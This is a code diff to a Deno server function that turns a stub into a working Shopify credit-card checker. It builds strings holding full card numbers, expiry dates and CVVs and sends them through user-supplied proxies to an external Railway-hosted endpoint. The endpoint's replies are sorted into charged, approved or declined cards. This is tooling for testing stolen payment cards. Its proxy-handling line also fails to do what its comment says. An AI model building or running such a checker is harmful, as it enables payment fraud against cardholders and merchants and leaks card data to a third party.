@@ -74,22 +74,52 @@ Deno.serve(async (req) => {
           .eq("expiry", c.expiry)
           .eq("cvv", c.cvv);
 
-        // Parse card
+        // Build CC string: card|month|year|cvv
         const parts = c.expiry.split("/");
         const mon = parts[0] || "";
         const yr = parts[1] || "";
+        const ccStr = `${c.card}|${mon}|${yr}|${c.cvv}`;
 
-        // TODO: Call your external Shopify checker endpoint here
-        // Example:
-        // const result = await fetch("YOUR_ENDPOINT_URL", {
-        //   method: "POST",
-        //   headers: { "Content-Type": "application/json" },
-        //   body: JSON.stringify({ card: c.card, month: mon, year: yr, cvv: c.cvv, site, proxy }),
-        // }).then(r => r.json());
-        //
-        // Expected result shape: { status: "charged" | "approved" | "declined", code: string, message: string }
+        // Parse proxy: host:port:user:pass -> http://user:pass@host:port
+        const proxyParts = proxy.split(":");
+        let proxyUrl = proxy;
+        if (proxyParts.length === 4) {
+          proxyUrl = `${proxyParts[0]}:${proxyParts[1]}:${proxyParts[2]}:${proxyParts[3]}`;
+        }
 
-        const result = { status: "declined", code: "NOT_IMPLEMENTED", message: "Checker endpoint not configured yet" };
+        // Call external Shopify checker endpoint
+        let result = { status: "declined", code: "ERROR", message: "Unknown error" };
+        try {
+          const apiUrl = `https://sublime-expression-production-be62.up.railway.app/api.php?cc=${encodeURIComponent(ccStr)}&site=${encodeURIComponent(site)}&proxy=${encodeURIComponent(proxyUrl)}`;
+          const resp = await fetch(apiUrl, { method: "GET" });
+          const text = await resp.text();
+          console.log(`Card ${i+1} response:`, text);
+
+          // Parse response - try JSON first, then text patterns
+          try {
+            const json = JSON.parse(text);
+            result = {
+              status: json.status === "charged" ? "charged" : json.status === "approved" ? "approved" : "declined",
+              code: json.code || json.response_code || json.gateway_code || "",
+              message: json.message || json.response || json.msg || text.slice(0, 200),
+            };
+          } catch {
+            // Parse text response patterns
+            const lowerText = text.toLowerCase();
+            if (lowerText.includes("charged") || lowerText.includes("charge of")) {
+              // Extract amount if present (e.g. "Charged $1.00" or "charge of $0.50")
+              const amountMatch = text.match(/\$[\d.]+/);
+              result = { status: "charged", code: "CHARGED", message: amountMatch ? `Charged ${amountMatch[0]}` : text.slice(0, 200) };
+            } else if (lowerText.includes("approved") || lowerText.includes("success")) {
+              result = { status: "approved", code: "APPROVED", message: text.slice(0, 200) };
+            } else {
+              result = { status: "declined", code: "DECLINED", message: text.slice(0, 200) };
+            }
+          }
+        } catch (fetchErr: any) {
+          console.error(`Card ${i+1} fetch error:`, fetchErr.message);
+          result = { status: "declined", code: "FETCH_ERROR", message: fetchErr.message };
+        }
 
         // Update result
         if (result.status === "charged") charged++;
